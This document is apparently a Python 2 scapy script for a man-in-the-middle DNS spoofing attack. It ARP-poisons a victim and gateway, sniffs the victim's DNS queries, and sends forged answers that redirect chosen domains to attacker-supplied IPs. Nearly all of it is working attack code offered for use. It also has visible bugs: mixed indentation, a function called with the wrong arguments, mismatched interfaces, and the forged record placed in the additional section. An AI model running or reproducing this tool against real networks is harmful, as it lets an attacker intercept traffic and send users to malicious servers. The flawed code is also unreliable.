from scapy.all import *
from arpPoison import *
import time

interface = "enp0s3"

# victimNotInvolved = False
# dnsQueryFromVictim = True


def getDnsMsg(hwA,hwV,ipV,ipG,urlsToSpoof):

    print("sniffing")
    tic = time.time()
    arpPoison(hwA,hwV,ipV,ipG)

    while(True):
	toc = time.time()
	if toc-tic > 0.2:
	    tic = toc
	    arpPoison(hwA,hwV,ipV,ipG)
	    print("-------------------ARP poisoning")
	
        pkt = sniff(count=1,iface="enp0s9",filter="udp port 53")[0]
	print("black fucking magic")

        if pkt.haslayer(DNS):
            dnsQueryFromVictim, goodUrl = getDnsMsgType(pkt,ipV,urlsToSpoof)
	    print("packet found")
            return (pkt, dnsQueryFromVictim, goodUrl)
	else:
	    print("done")
    
    
def getDnsMsgType(pkt,ipV,urlsToSpoof):
    
    if pkt[IP].src == ipV: 
        if urlsToSpoof:
            goodUrl = bool(pkt[IP][DNS].qd.qname in urlsToSpoof.keys())
        else: 
            goodUrl = True
        return (True, goodUrl)
    
    else: 
        return (False, False)

def dnsSpoofVictimQuery(pkt,goodUrl):

    pkt.show()

    return

def dnsPoisoningBad(urlsToSpoof):

    print("\nDNS poisoning attack\n")

    ipVictim = raw_input("Victim IP address: ")

    (pkt,dnsQueryFromVictim,goodUrl) = getDnsMsg(ipVictim,urlsToSpoof)
    
    if dnsQueryFromVictim:
        dnsSpoofVictimQuery(pkt,goodUrl)
    else:
        pass

    return

def dnsPoisoning(urlsToSpoof):

    print("\nDNS poisoning attack\n")

    global interface
    interface = getInterface(interface)

    hwA = raw_input("Attacker MAC address: ")
    ipV = raw_input("Victim IP address: ")
    hwV = raw_input("Victim MAC address: ")
    ipG = raw_input("Gateway IP address: ")

    (pkt,dnsQueryFromVictim,goodUrl) = getDnsMsg(hwA,hwV,ipV,ipG,urlsToSpoof)

    if dnsQueryFromVictim and goodUrl:
	
	dnsResponse = dnsForgeResponse(pkt, urlsToSpoof)
	dnsResponse.show()
	sendp(dnsResponse, iface=interface)

    return

def dnsForgeResponse(pkt, urlsToSpoof):

    urlRequested = pkt[DNS].qd.qname

    if urlsToSpoof:
	ipA = urlsToSpoof[urlRequested]

    else:
	ipA = "10.0.2.4"

    eth = Ether(
	src = pkt[Ether].dst, 
	dst = pkt[Ether].src
	)

    ip = IP(
	src = pkt[IP].dst, 
	dst = pkt[IP].src
	)

    udp = UDP(
	sport = 53, 
	dport = pkt[UDP].sport
	)
    
    dns = DNS(
	id = pkt[DNS].id,
	qd = pkt[DNS].qd,
	aa = 1,
	rd = 0,
	qr = 1,
	qdcount = 1,
	ancount = 1,
	nscount = 0,
	arcount = 0,
	ar = DNSRR(
	    rrname = urlRequested,
	    type = "A",
	    ttl = 600,
	    rdata = ipA
	    )
	)

    return eth / ip / udp / dns

####################################################################################################################################

def showUrlsToSpoof(urlsToSpoof):
    print("URLs to spoof:")
    
    for url in urlsToSpoof.keys():
	print(url)

    print("")

def inputUrlsToSpoof(urlsToSpoof):

    print("\ninput URLs to spoof")
    print("after entering last URL, enter c to continue\n")    

    def addUrls(urlsToSpoof):
	
	urlsToSpoof[user_in] = user_in_2
	urlsToSpoof["*." + user_in] = user_in_2
	urlsToSpoof["www." + user_in] = user_in_2

        return urlsToSpoof
    
    while(True):
	user_in = raw_input("URL to spoof: ")
        user_in_split = user_in.split(".")
    
        if user_in == "c":
            return urlsToSpoof
    
        elif len(user_in_split) == 2:
	    user_in_2 = raw_input("IP to use: ")
	    urlsToSpoof = addUrls(urlsToSpoof)

        elif len(user_in_split) == 3:
	    user_in_2 = raw_input("IP to use: ")

	    if user_in_split[0] in ("*.", "www"):
	        del user_in_split[0]
	        user_in = ".".join(user_in_split)
	        urlsToSpoof = addUrls(urlsToSpoof)
	
	    else:
	        urlsToSpoof[user_in] = user_in_2
    
        else:
	    print("Error: bad input \"" + str(user_in) + "\"")
